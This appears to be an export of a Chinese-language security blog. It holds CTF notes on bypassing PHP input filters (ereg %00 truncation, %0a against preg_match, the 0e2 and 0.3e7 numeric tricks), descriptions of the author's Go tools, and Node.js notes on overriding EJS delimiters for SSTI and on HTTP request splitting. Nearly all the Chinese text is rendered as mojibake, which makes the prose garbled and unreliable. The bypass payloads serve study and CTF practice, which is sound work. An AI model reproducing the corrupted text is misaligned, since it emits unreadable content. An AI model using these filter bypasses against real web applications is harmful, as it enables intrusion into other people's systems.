<p><strong>[æ‰€ä»¥é‡åˆ°æ— æ³•æ‰§è¡Œæ—¶ï¼Œå¯èƒ½æ˜¯å‡ºé¢˜äººæ²¡æœ‰æ³¨æ„éƒ¨ç½²é¢˜ç›®ç¯å¢ƒ]</strong></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²<span class="punctuation">,</span>å¦‚æœåŒ¹é…æˆåŠŸè¿”å›<span class="keyword">true</span><span class="punctuation">,</span>å¦åˆ™<span class="punctuation">,</span>åˆ™è¿”å›<span class="keyword">false</span>ã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ </span><br><span class="line"></span><br><span class="line">eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡<span class="punctuation">,</span>æ‰€ä»¥å¯ä»¥ä½¿ç”¨<span class="variable">%00</span>æˆªæ–­æ­£åˆ™åŒ¹é…</span><br><span class="line"></span><br><span class="line">æ¯”å¦‚</span><br><span class="line">ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span><span class="punctuation">,</span> $_GET[&#x27;<span class="keyword">c</span>&#x27;])</span><br><span class="line"></span><br><span class="line">å½“<span class="keyword">c</span><span class="operator">=</span>a<span class="variable">%00123</span>æ—¶</span><br><span class="line">eregåªä¼šæ£€æµ‹åˆ°ç¬¬ä¸€ä¸ªaä¸ºæ­¢ï¼Œåé¢çš„æ•°æ®éƒ½è¢«<span class="variable">%00</span>æˆªæ–­äº†ï¼Œä»è€Œç»•è¿‡åŒ¹é…</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ç°åœ¨ä¸€èˆ¬ä¸å†ä½¿ç”¨<code>ereg</code>ï¼Œåªæ˜¯åšä¸º<code>preg_match</code>æ›¿ä»£å‡½æ•°ä½¿ç”¨</p>
<h2 id="3-phpå‡½æ•°sleep"><a href="#3-phpå‡½æ•°sleep" class="headerlink" title="3)phpå‡½æ•°sleep"></a>3)phpå‡½æ•°sleep</h2><blockquote>
<p>å½“é‡åˆ°è¿™ç§éœ€è¦æˆ‘ä»¬è¾“å…¥å‚æ•°ï¼Œä½†æ˜¯è®©å‚æ•°å€¼å¿…é¡»å¾ˆå¤§ï¼Œ</p>
<p>è€Œä¸”æœ€ååˆä»¥è¿™ä¸ªå‚æ•°æ‰§è¡Œsleepå‡½æ•°ï¼Œå°±ä¼šè®©æˆ‘ä»¬ç­‰å¾ˆä¹…</p>
</blockquote>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">sleep</span><span class="params">((int)</span></span><span class="variable">$time</span>)</span><br></pre></td></tr></table></figure>

<p><code>sleep()</code>è¦å»¶ç¼“å…¶ç¨‹åºæ‰§è¡Œçš„æ—¶é—´ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬åˆä¸èƒ½ç­‰å¤ªä¹…ï¼Œå¯ä»¥æ„é€ phpä¸­çš„ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼Œå°±æ„é€ ä¸€ä¸ª  </p>
<blockquote>
<p><code>time=0.3e7 ï¼ˆç­‰ä»·äº0.3ä¹˜10çš„7æ¬¡æ–¹ï¼‰</code> </p>
</blockquote>
<p>è¿™æ ·å®ƒçš„å€¼è¾¾åˆ°äº†åˆ¤æ–­çš„æ ‡å‡†ã€‚</p>
<p>è€Œä¸”å½“å®ƒ<strong>å¼ºåˆ¶è½¬åŒ–ä¸ºæ•´æ•°å‹</strong>(<code>int</code>)çš„æ—¶å€™å°±ä¼šå› ä¸ºå¼€å¤´ä¸º<code>0.3</code>æ˜¯<strong>å°æ•°å˜æˆé›¶</strong>ï¼Œè¿™æ ·å¯ä»¥æ»¡è¶³æ¡ä»¶ã€‚</p>
<h2 id="4-phpå‡½æ•°is-numeric"><a href="#4-phpå‡½æ•°is-numeric" class="headerlink" title="4)phpå‡½æ•°is_numeric()"></a>4)phpå‡½æ•°is_numeric()</h2><p>å½“é‡åˆ°ç±»ä¼¼</p>
<blockquote>
<p><code>0e..;1e;..2e..;...</code></p>
</blockquote>
<p>å‡½æ•°ä¼šæŠŠå…¶å½“ä½œç§‘å­¦è®¡æ•°æ³•</p>
<p>è¿™æ ·å½“é‡åˆ°</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$num</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">if</span>(<span class="variable">$num</span>)&#123;</span><br><span class="line">            <span class="built_in">if</span>(!<span class="built_in">is_numeric</span>(<span class="variable">$time</span>))</span><br></pre></td></tr></table></figure>

<p>è¿™ç§</p>
<blockquote>
<p>ç¬¬ä¸€ä¸ªè¦å¼±ç±»å‹ä¸º<code>0</code></p>
<p>ç¬¬äºŒä¸ªè¦ä¸ä¸º<code>0</code>æ‰èƒ½æ‰§è¡ŒçœŸçš„åˆ¤æ–­</p>
<p>ç¬¬ä¸‰ä¸ªè¦æ±‚å…¶ä¸ºæ•°å­—</p>
</blockquote>
<p>å°±å¯ä»¥ç”¨ç±»ä¼¼<code>0e2</code>ï¼Œç»•è¿‡è¿™ä¸‰ä¸ª</p>
<h2 id="5-eval-å‡½æ•°å’Œsystem-å‡½æ•°çš„æ¯”è¾ƒ"><a href="#5-eval-å‡½æ•°å’Œsystem-å‡½æ•°çš„æ¯”è¾ƒ" class="headerlink" title="5)eval()å‡½æ•°å’Œsystem()å‡½æ•°çš„æ¯”è¾ƒ"></a>5)eval()å‡½æ•°å’Œsystem()å‡½æ•°çš„æ¯”è¾ƒ</h2><p><code>è®°å½•ä¸€æ¬¡åœ¨æ‰“é¶æœºæ—¶ï¼Œå› ä¸ºå¹³å¸¸ä¹ æƒ¯ç”¨ eval()å‡½æ•°ï¼Œä½†æ˜¯é¶æœºæ‰§è¡Œncç­‰å‘½ä»¤æ—¶ï¼Œeval()å‡½æ•°æ²¡æœ‰ååº”ï¼Œå°±æ˜¯å› ä¸ºå…¶æ˜¯ä»£ç æ‰§è¡Œï¼Œè€Œéå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æŠŠä¸¤è€…æœ¬è´¨çš„ç”¨æ³•ææ‡‚è¿˜æ˜¯å¾ˆå¿…è¦çš„</code></p>
<blockquote>
<p>evalç±»å‹å‡½æ•°æ˜¯ä»£ç æ‰§è¡Œè€Œä¸æ˜¯å‘½ä»¤æ‰§è¡Œï¼ˆä¸€å¥è¯æœ¨é©¬ï¼‰</p>
<p>systemç±»å‹å‡½æ•°æ˜¯å‘½ä»¤æ‰§è¡Œè€Œä¸æ˜¯ä»£ç æ‰§è¡Œ</p>
<p>evalå‡½æ•°é‡Œå¿…é¡»æ˜¯ä¸€ä¸ªç¬¦åˆphpè¯­æ³•çš„è¯­å¥ï¼Œå¦‚æœè¯­å¥ç»“å°¾æ²¡æœ‰åˆ†å·ä¼šæŠ¥é”™ï¼ševal()â€™d code</p>
</blockquote>
<h2 id="6-PHPã®mbç³»åˆ—å‡½æ•°è¿”å›å€¼"><a href="#6-PHPã®mbç³»åˆ—å‡½æ•°è¿”å›å€¼" class="headerlink" title="6)PHPã®mbç³»åˆ—å‡½æ•°è¿”å›å€¼"></a>6)PHPã®mbç³»åˆ—å‡½æ•°è¿”å›å€¼</h2><blockquote>
<p><code>https://github.com/php/php-src/issues/9008</code></p>
<p>å®ƒä¼šå¯¼è‡´å¥‡æ€ªçš„ç»“æœã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;BASE64&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="literal">null</span>, <span class="literal">true</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="title function_ invoke__">mb_detect_order</span>(), <span class="literal">true</span>),</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$string</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$string</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°çš„ç»“æœå‘ç°</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Output for <span class="number">8.2</span><span class="number">.0</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.0</span><span class="number">.1</span> - <span class="number">8.0</span><span class="number">.26</span><span class="punctuation">,</span> <span class="number">8.1</span><span class="number">.10</span> - <span class="number">8.1</span><span class="number">.13</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.1</span><span class="number">.0</span> - <span class="number">8.1</span><span class="number">.9</span></span><br><span class="line">string(<span class="number">6</span>) <span class="string">&quot;BASE64&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>mb_detect_encoding($string, null, true)</code>è¿”å›å€¼</p>
<p>åªæœ‰åœ¨<code>PHP</code>ç‰ˆæœ¬åœ¨<code>8.1.0 - 8.1.9</code>æ—¶ä¼šè¿”å›<code>base64</code>ï¼Œè€Œåœ¨å…¶ä»–ç‰ˆæœ¬éƒ½æ˜¯é»˜è®¤è¯†åˆ«ä¸º<code>ASCII</code></p>
</blockquote>
<blockquote>
<p><code>mb_detect_encoding()</code>è¿™ç±»çš„å‡½æ•°å¯¹å†…å®¹è¿›è¡Œç¼–ç çš„è¯†åˆ«ï¼Œå°±æ˜¯<code>åŒ¹é…å†…å®¹ä¸­çš„ä¸€äº›ç¬¦åˆç¼–ç çš„å­—ç¬¦ï¼ŒåŒ¹é…æˆåŠŸå¯¹åº”ç¼–ç åŠ åˆ†</code>ï¼Œæœ€åä»å¤´åˆ°å°¾åŒ¹é…å®Œæˆåï¼Œ<code>æ‰“åˆ†æœ€é«˜çš„ç¼–ç å°±è¢«è®¤ä¸ºæ˜¯è¯¥å†…å®¹çš„ç¼–ç </code></p>
</blockquote>
<h2 id="7-preg-match-â€˜-â€˜"><a href="#7-preg-match-â€˜-â€˜" class="headerlink" title="7)preg_match(â€˜&#x2F;^$&#x2F;â€˜)"></a>7)preg_match(â€˜&#x2F;^$&#x2F;â€˜)</h2><p>å¯ä»¥ç”¨<code>%0a</code>ç»•è¿‡ï¼Œ</p>
<p>æ¯”å¦‚ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^123$/&#x27;</span>,<span class="variable">$a</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸€èˆ¬æƒ…å†µåªæœ‰<code>$a</code>ä¸º<code>123</code>æ—¶æ‰å¯ä»¥é€šè¿‡ï¼Œä½†æ˜¯ç”¨æ¢è¡Œç¬¦å·<code>%0a</code></p>
<p>å°±å¯ä»¥ç»•è¿‡</p>
<p><img src="/post/php-functions/image-20230908170938509.png" alt="image-20230908170938509"></p>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>å·¥å…·é¡¹ç›®ç¼–å†™</title>
    <url>//post/tools-making/</url>
    <content><![CDATA[<p><code>ä¸»è¦é€šè¿‡å†™é¡¹ç›®ç»ƒä¹ ä¸€ä¸‹è‡ªå·±çš„goè¯­è¨€æ°´å¹³</code></p>
<span id="more"></span>

<h1 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h1><p><a href="https://github.com/try-to-change/wfuzz-ttoc">https://github.com/try-to-change/wfuzz-ttoc</a></p>
<blockquote>
<ol>
<li>å®šä¹‰å‘½ä»¤è¡Œå‚æ•°ï¼Œä½¿ç”¨flagåŒ…è¿›è¡Œè§£æã€‚</li>
<li>ä½¿ç”¨httpåŒ…å‘é€è¯·æ±‚ï¼Œå¹¶ä½¿ç”¨goroutineå’Œchannelå®ç°å¹¶å‘ã€‚</li>
<li>åœ¨å‘é€è¯·æ±‚ä¹‹å‰ï¼Œæ ¹æ®ä¼ å…¥çš„å‚æ•°ï¼Œä½¿ç”¨stringsåŒ…ä¸­çš„Replaceå‡½æ•°æ›¿æ¢FUZZå‚æ•°ã€‚</li>
<li>æ ¹æ®ä¸åŒçš„payloadæ ¼å¼ï¼Œä½¿ç”¨bufioåŒ…è¿›è¡Œè¯»å–å’Œè§£æã€‚</li>
<li>ä½¿ç”¨forå¾ªç¯å’Œrangeå…³é”®å­—å®ç°è¿­ä»£å™¨ã€‚</li>
<li>æ ¹æ®é¡µé¢å“åº”ã€çŠ¶æ€ç ç­‰ä¿¡æ¯ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æˆ–æ ‡å‡†åº“ä¸­çš„httpåŒ…ä¸­çš„Responseç»“æ„ä½“ä¸­çš„çŠ¶æ€ç ç­‰ä¿¡æ¯è¿›è¡Œåˆ¤æ–­ã€‚</li>
<li>å°†è¯·æ±‚ç»“æœè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºæˆ–æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨æ ‡å‡†åº“ä¸­çš„ioåŒ…å³å¯ã€‚åŒæ—¶å¯ä»¥åœ¨è¾“å‡ºæ—¶ï¼Œæ·»åŠ æ›´å¤šçš„ä¿¡æ¯ï¼Œå¦‚è¯·æ±‚çš„URLã€å“åº”çŠ¶æ€ç ç­‰ã€‚</li>
<li>ä½¿ç”¨logåŒ…è®°å½•ç¨‹åºè¿è¡Œæ—¥å¿—ï¼Œæ–¹ä¾¿è°ƒè¯•å’Œé”™è¯¯å¤„ç†</li>
<li>å®ç°ç»Ÿè®¡è¯·æ±‚æ¬¡æ•°ã€æˆåŠŸæ¬¡æ•°ã€å¤±è´¥æ¬¡æ•°ç­‰åŠŸèƒ½ï¼Œæ–¹ä¾¿å¯¹å·¥å…·æ€§èƒ½è¿›è¡Œè¯„ä¼°ã€‚</li>
</ol>
</blockquote>
<blockquote>
<p>å¯¹äºwfuzzæ›´æ·±å…¥åŠŸèƒ½å¹¶æœªè¿›è¡Œä¹¦å†™</p>
<p>ç”±äºç»ƒæ‰‹ç†Ÿæ‚‰goå¼€å‘ï¼Œæ‰€ä»¥åªå¤§è‡´å®ç°äº†éƒ¨åˆ†åŠŸèƒ½ï¼Œå…¶å®æˆ‘ä¹Ÿè§‰å¾—ä»£ç ç¨å¾®æœ‰ç‚¹è‡ƒè‚¿ï¼Œå¦‚æœæœ‰å»ºè®®å’Œä¼˜åŒ–çš„æ€è·¯ï¼Œæˆ‘å°†æ—¶åˆ»å‡†å¤‡å­¦ä¹ ä½ çš„å»ºè®®</p>
</blockquote>
<h1 id="MD5-FLC"><a href="#MD5-FLC" class="headerlink" title="MD5_FLC"></a>MD5_FLC</h1><p><a href="https://github.com/try-to-change/MD5_FIC">https://github.com/try-to-change/MD5_FIC</a></p>
<blockquote>
<p>æœ¬é¡¹ç›®æ˜¯åŸºäºgolangçš„CSæ¨¡å¼çš„md5æ–‡ä»¶å®Œæ•´æ€§æ£€æµ‹ï¼Œå®ç°å®¢æˆ·ç«¯çš„uiåŒ–ï¼Œä¾¿äºé€‰æ‹©æ£€æµ‹ä¸Šä¼ æ–‡ä»¶ï¼Œå¯¹ä¸€äº›è¿æ¥é—®é¢˜è¿›è¡Œäº†å¤„ç†ï¼Œå¯¹äºæ£€æµ‹å¤±è´¥çš„æ–‡ä»¶ä¼šè¿›è¡Œåˆ é™¤ï¼Œå¯¹äºä¸Šä¼ æ–‡ä»¶ï¼Œä¸ºäº†æœåŠ¡å™¨å®‰å…¨ä¼šè¿›è¡Œåå­—æ ¹æ®æ—¶é—´hashé‡æ–°ç¼–ç </p>
<p>é¡¹ç›®ä¸»è¦ä¸ºå·¥ç¨‹å®è·µå®Œæˆï¼Œå¯èƒ½åœ¨å®é™…è¿è¡Œä¸­å­˜åœ¨é—®é¢˜ï¼Œå¯ä»¥åœ¨<code>issues</code>ä¸­ä¸æˆ‘äº¤æµæˆ–è€…<code>Pull requests</code>å³å¯</p>
</blockquote>
<p><img src="/post/tools-making/image-20230515000227707.png" alt="image-20230515000227707"></p>
<p><img src="/post/tools-making/image-20230515000303058.png" alt="image-20230515000303058"></p>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>goè¯­è¨€</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs(æ‹†åˆ†æ”»å‡»)</title>
    <url>//post/nodejs(%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB)/</url>
    <content><![CDATA[<p><code>æ€»ç»“å­¦ä¹ ä¸€ä¸‹ï¼Œé‡ç‚¹æŠŠæ‹†åˆ†æ”»å‡»å­¦ä¹ è®°å¿†ä¸€ä¸‹ï¼ŒåŸå‹é“¾æ±¡æŸ“å•ç‹¬å¼€ä¸€ç¯‡å†™</code></p>
<span id="more"></span>

<h2 id="res-render"><a href="#res-render" class="headerlink" title="res.render()"></a>res.render()</h2><p><code>res.render()</code>æ˜¯ Node.js ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒå¯ä»¥<code>æ¸²æŸ“è§†å›¾å¹¶å°†æ¸²æŸ“åçš„ HTML å­—ç¬¦ä¸²å‘é€ç»™å®¢æˆ·ç«¯</code>ã€‚å®ƒå¯ç”¨äºé€šè¿‡ä»æœåŠ¡å™¨ä¼ é€’çš„æ•°æ®å‘ˆç°åŠ¨æ€å†…å®¹ã€‚</p>
<p>ä»¥ä¸‹æ˜¯åœ¨ Node.js ä¸­ä½¿ç”¨ <code>res.render()</code> çš„ç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> data = &#123; <span class="attr">message</span>: <span class="string">&#x27;ä½ å¥½ï¼Œä¸–ç•Œï¼&#x27;</span> &#125;;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®æ ¹ URL æ—¶ï¼ŒæœåŠ¡å™¨å°†é€šè¿‡ä½¿ç”¨åŒ…å«æ¶ˆæ¯ <code> ä½ å¥½ï¼Œä¸–ç•Œï¼</code>çš„ <code>data</code> å¯¹è±¡æ¥å‘ˆç° <code>index</code> è§†å›¾ï¼Œå¹¶å‘å®¢æˆ·ç«¯å‘é€å“åº”ã€‚</p>
<p><code>index</code> è§†å›¾é€šå¸¸æ˜¯ä½¿ç”¨æ¨¡æ¿è¯­è¨€ç¼–å†™çš„æ¨¡æ¿æ–‡ä»¶ï¼Œä¾‹å¦‚ EJSã€Handlebars æˆ– Pugã€‚</p>
<h2 id="é‡å®šå‘æ¦‚å¿µ"><a href="#é‡å®šå‘æ¦‚å¿µ" class="headerlink" title="é‡å®šå‘æ¦‚å¿µ"></a>é‡å®šå‘æ¦‚å¿µ</h2><p>Expressæ˜¯ä¸€ä¸ªåŸºäº<code>Node.js</code>å®ç°çš„Webæ¡†æ¶ï¼Œ</p>
<p>å…¶å“åº”HTTPè¯·æ±‚çš„responseå¯¹è±¡ä¸­æœ‰ä¸¤ä¸ªç”¨äºURLè·³è½¬æ–¹æ³•</p>
<p><code>res.location()</code>å’Œ<code>res.redirect()</code></p>
<h3 id="res-location"><a href="#res-location" class="headerlink" title="res.location()"></a>res.location()</h3><p>res.location()é‡Œé¢çš„å‚æ•°æœ‰ä¸‰ç§ï¼Œä¸€ç§æ˜¯å½“å‰åŸŸåè·¯å¾„ï¼ˆä¾‹å¦‚â€&#x2F;api&#x2F;postâ€ï¼‰ï¼Œä¸€ç§æ˜¯ç»å¯¹è·¯å¾„(â€œ<a href="https://www.oecom.cn/api/post">https://www.oecom.cn/api/post</a> â€œ)ï¼Œå¦ä¸€ç§å°±æ˜¯ç›´æ¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼šback</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">res.<span class="keyword">location</span>(<span class="string">&#x27;/api/post&#x27;</span>);</span><br><span class="line">res.<span class="keyword">location</span>(<span class="string">&#x27;https://www.oecom.cn/api/post&#x27;</span>);</span><br><span class="line">res.<span class="keyword">location</span>(<span class="string">&#x27;back&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="res-redirect"><a href="#res-redirect" class="headerlink" title="res.redirect"></a>res.redirect</h3><p><code>redirect()</code>å¯ä»¥æ·»åŠ ä¸¤ä¸ªå‚æ•°ï¼Œ</p>
<p>å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ•°å€¼ç±»å‹ï¼Œåˆ™ä»£è¡¨é‡å®šå‘æ–¹å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œå°±æ˜¯éœ€è¦è·³è½¬åˆ°çš„è·¯å¾„ã€‚</p>
<p>å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™ç›´æ¥ä»£è¡¨è·³è½¬çš„è·¯å¾„<br>é‡å®šå‘æ–¹å¼æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯<code>301</code>é‡å®šå‘ï¼ˆæ°¸ä¹…é‡å®šå‘ï¼‰ï¼Œå¦ä¸€ç§æ˜¯<code>302</code>é‡å®šå‘ï¼ˆä¸´æ—¶é‡å®šå‘ï¼‰ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°ä¸å¡«ï¼Œåˆ™<code>é»˜è®¤ä¸º302</code>é‡å®šå‘ã€‚è‡³äºç¬¬äºŒä¸ªå‚æ•°è·¯å¾„ï¼Œåˆ™å’Œ<code>location</code>ä¸€è‡´ã€‚<br>åœ¨<code>redirect</code>ä¸­æœ‰ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œå³ï¼š<code>res.redirect(&quot;api/post&quot;)</code>ï¼Œå‡è®¾åœ¨ç¨‹åºåœ¨<code>/get</code>è·¯ç”±ä¸‹ï¼Œåˆ™è¡¨ç¤ºè¦è·³è½¬çš„è·¯å¾„ä¸º<code>/get/api/post</code>ã€‚</p>
<p>ä¸ªäººä¸æ¨èè¿™ç§æ–¹å¼ï¼Œå› ä¸ºåœ¨åç»­çš„ä»£ç é˜…è¯»æ—¶ä¸åˆ©äºå¿«é€Ÿç†è§£é‡å®šå‘ä½ç½®ã€‚</p>
<h2 id="delimiter"><a href="#delimiter" class="headerlink" title="delimiter"></a>delimiter</h2><p>è¿™æ˜¯å¯¹æ ‡ç­¾çš„åˆ†éš”ç¬¦å®šä¹‰çš„é€‰é¡¹ï¼Œæœ‰æ—¶å€™å½“å¯¹sstiä¸€äº›æ ‡ç­¾è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¦‚æœå­˜åœ¨å°†å‚æ•°è¿›è¡Œæ¸²æŸ“ï¼Œä¸”å‚æ•°æ˜¯å¯æ§ï¼Œå¯ä»¥å°è¯•<code>delimiter</code>æ·»åŠ è¿›å»ï¼Œè®©å…¶åœ¨æ¸²æŸ“çš„æ—¶å€™å¯ä»¥è¦†ç›–ä¿®æ”¹<code>delimiter</code>å†…å®¹ï¼Œä½¿å¾—å¯ä»¥ç”¨å…¶ä»–åˆ†éš”ç¬¦ç»•è¿‡</p>
<h3 id="Custom-delimiters"><a href="#Custom-delimiters" class="headerlink" title="Custom delimiters"></a>Custom delimiters</h3><p>è‡ªå®šä¹‰åˆ†éš”ç¬¦å¯ä»¥åŸºäºæ¯ä¸ªæ¨¡æ¿åº”ç”¨ï¼Œä¹Ÿå¯ä»¥å…¨å±€åº”ç”¨ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>),</span><br><span class="line">    users = [<span class="string">&#x27;geddy&#x27;</span>, <span class="string">&#x27;neil&#x27;</span>, <span class="string">&#x27;alex&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Just one template</span></span><br><span class="line">ejs.<span class="title function_">render</span>(<span class="string">&#x27;&lt;p&gt;[?= users.join(&quot; | &quot;); ?]&lt;/p&gt;&#x27;</span>, &#123;<span class="attr">users</span>: users&#125;, &#123;<span class="attr">delimiter</span>: <span class="string">&#x27;?&#x27;</span>, <span class="attr">openDelimiter</span>: <span class="string">&#x27;[&#x27;</span>, <span class="attr">closeDelimiter</span>: <span class="string">&#x27;]&#x27;</span>&#125;);</span><br><span class="line"><span class="comment">// =&gt; &#x27;&lt;p&gt;geddy | neil | alex&lt;/p&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Or globally</span></span><br><span class="line">ejs.<span class="property">delimiter</span> = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">ejs.<span class="property">openDelimiter</span> = <span class="string">&#x27;[&#x27;</span>;</span><br><span class="line">ejs.<span class="property">closeDelimiter</span> = <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">ejs.<span class="title function_">render</span>(<span class="string">&#x27;&lt;p&gt;[?= users.join(&quot; | &quot;); ?]&lt;/p&gt;&#x27;</span>, &#123;<span class="attr">users</span>: users&#125;);</span><br><span class="line"><span class="comment">// =&gt; &#x27;&lt;p&gt;geddy | neil | alex&lt;/p&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="NodeJS-ä¸­çš„-CRLF-SSRF-Injection"><a href="#NodeJS-ä¸­çš„-CRLF-SSRF-Injection" class="headerlink" title="NodeJS ä¸­çš„ CRLF&#x2F;SSRF Injection"></a>NodeJS ä¸­çš„ CRLF&#x2F;SSRF Injection</h2><blockquote>
<p>æœ¬æ–‡ç”±<strong>WHOAMI</strong>åŸåˆ›å‘å¸ƒ</p>
<p>è½¬è½½ï¼Œè¯·å‚è€ƒ<a href="https://www.anquanke.com/note/repost">è½¬è½½å£°æ˜</a>ï¼Œæ³¨æ˜å‡ºå¤„ï¼š <a href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p>
<p>å®‰å…¨å®¢ - æœ‰æ€æƒ³çš„å®‰å…¨æ–°åª’ä½“</p>
</blockquote>
<p>2018 å¹´æœ‰ç ”ç©¶è€…å‘ç°ï¼Œå½“Node.jsä½¿ç”¨ <code>http.get</code> å‘ç‰¹å®šè·¯å¾„å‘å‡ºHTTPè¯·æ±‚æ—¶ï¼Œå‘å‡ºçš„è¯·æ±‚å®é™…ä¸Šè¢«å®šå‘åˆ°äº†ä¸ä¸€æ ·çš„è·¯å¾„ï¼</p>
<p><img src="https://p5.ssl.qhimg.com/t01e1beeee10e196ba2.png" alt="img"></p>
<p>æ·±å…¥ç ”ç©¶ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ªé—®é¢˜æ˜¯ç”±Node.jså°†HTTPè¯·æ±‚å†™å…¥è·¯å¾„æ—¶ï¼Œå¯¹Unicodeå­—ç¬¦çš„æœ‰æŸç¼–ç å¼•èµ·çš„ã€‚</p>
<blockquote>
<p>Â·æ³¨ï¼šnodejs&lt;&#x3D;8 çš„æƒ…å†µä¸‹å­˜åœ¨ Unicode å­—ç¬¦æŸåå¯¼è‡´çš„ HTTP æ‹†åˆ†æ”»å‡»ï¼Œnodejs ä¸ä¼šå¯¹è¿™äº› Unicode è¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯ HTTP æ§åˆ¶å­—ç¬¦</p>
</blockquote>
